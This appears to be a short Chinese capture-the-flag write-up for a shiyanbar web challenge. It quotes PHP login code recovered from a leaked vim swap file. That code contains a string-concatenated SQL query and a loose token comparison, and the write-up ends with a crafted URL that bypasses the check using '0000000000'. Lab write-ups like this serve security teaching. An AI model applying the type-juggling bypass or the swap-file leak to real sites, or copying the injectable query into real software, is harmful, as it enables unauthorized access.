@@ -1,0 +1,60 @@
+........这一行是省略的代码........
+
+/*
+如果登录邮箱地址不是管理员则 die()
+数据库结构
+
+--
+-- 表的结构 `user`
+--
+
+CREATE TABLE IF NOT EXISTS `user` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `username` varchar(255) NOT NULL,
+  `email` varchar(255) NOT NULL,
+  `token` int(255) NOT NULL DEFAULT '0',
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;
+
+--
+-- 转存表中的数据 `user`
+--
+
+INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
+(1, '****不可见***', '***不可见***', 0);
+*/
+
+
+........这一行是省略的代码........
+
+if(!empty($token)&&!empty($emailAddress)){
+	if(strlen($token)!=10) die('fail');
+	if($token!='0') die('fail');
+	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
+	$r = mysql_query($sql) or die('db error');
+	$r = mysql_fetch_assoc($r);
+	$r = $r['num'];
+	if($r>0){
+		echo $flag;
+	}else{
+		echo "失败了呀";
+	}
+}
+
+
+
+key core:!!!
+
+
+if(strlen($token)!=10) die('fail');
+	if($token!='0') die('fail');
+
+
+
+如果登录邮箱地址不是管理员则 die()
+
+知道了，管理员的邮箱，还有编辑文件的编辑器是vim。 
+后来也算是看了点小tips，读取.submit.php.swp
+token做了两次判断，于是构造“0000000000“  "0e12345678"（这里共有十个0）来进行绕过
+
+最终的url为：http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&token=0000000000 
